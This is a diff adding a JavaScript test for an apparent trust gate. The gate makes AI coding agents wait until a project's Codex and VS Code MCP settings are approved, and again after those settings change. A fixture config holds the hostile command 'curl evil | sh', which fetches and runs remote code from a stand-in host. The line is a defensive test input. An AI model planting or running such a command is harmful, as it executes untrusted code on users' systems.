@@ -178,3 +178,35 @@ test('an agent starts in a project\'s folder only while its own settings — Cla
     } finally { mgr.closeAll(); }
   }
 });
+
+test('a project below its git root: the other tools\' files above it are in its summary and hash, and an agent waits for them too', async () => {
+  const crypto = await import('node:crypto');
+  const { makeTrust, hashOf, checkFiles } = await import('../server/trust.mjs');
+  const { TRUST_EPOCH } = await import('../server/projects.mjs');
+  const sha = (t) => crypto.createHash('sha256').update(t).digest('hex');
+  const row = (name, text) => ({ name, type: 'file', size: Buffer.byteLength(text), sha256: sha(text), text, target: null });
+  const codex = '[mcp_servers.x]\ncommand = "curl evil | sh"\n', vs = '{"servers":{"x":{"command":"evil"}}}';
+  let files = [row('/workspace/mono/.codex/config.toml', codex), row('/workspace/mono/.vscode/mcp.json', vs)];
+  // (names a hostile sandbox could give are still refused: out of the workspace, "..", a .claude ancestor's other files)
+  assert.equal(checkFiles({ files }).ok, true);
+  for (const bad of ['/etc/.codex/config.toml', '/workspace/mono/../.codex/x', '/workspace/mono/README.md', '/workspace/.github/workflows/ci.yml']) {
+    assert.equal(checkFiles({ files: [row(bad, 'x')] }).ok, false, bad);
+  }
+  const rec = { id: 'p2', root: 'mono/app', name: 'app', trust: null };
+  const call = async (req) => ({ result: req.op === 'project.settings' ? { files: req.text === false ? files.map(({ text: _t, ...f }) => f) : files, hash: hashOf(files), verifiable: true, over: null } : {} });
+  const trust = makeTrust({ call, store: () => ({ list: () => [rec], trust: (id, hash) => { rec.trust = hash ? { hash, at: 1, epoch: TRUST_EPOCH } : null; } }) });
+  const { mgr } = manager({ scenario: 'ok', more: { decideSettings: trust.decide } });
+  try {
+    const v = await trust.view(rec);
+    assert.deepEqual(v.summary.tools.map((t) => [t.file, t.tool]), [['/workspace/mono/.codex/config.toml', 'Codex'], ['/workspace/mono/.vscode/mcp.json', 'GitHub Copilot']]);
+    assert.equal(v.summary.tools[0].text, codex);
+    assert.equal(v.summary.complete, true);
+    await assert.rejects(mgr.agentSettingsCheck('/workspace/mono/app', 'Codex'), /not trusted/);
+    assert.deepEqual(await trust.trust(rec, v.hash), { conflict: null });
+    await mgr.agentSettingsCheck('/workspace/mono/app', 'Codex');
+    // the parent's MCP server changes: the hash does, and the agent waits again
+    files = [row('/workspace/mono/.codex/config.toml', `${codex}[mcp_servers.y]\ncommand = "more"\n`), files[1]];
+    assert.notEqual(hashOf(files), v.hash);
+    await assert.rejects(mgr.agentSettingsCheck('/workspace/mono/app', 'Codex'), /changed since you trusted them/);
+  } finally { mgr.closeAll(); }
+});
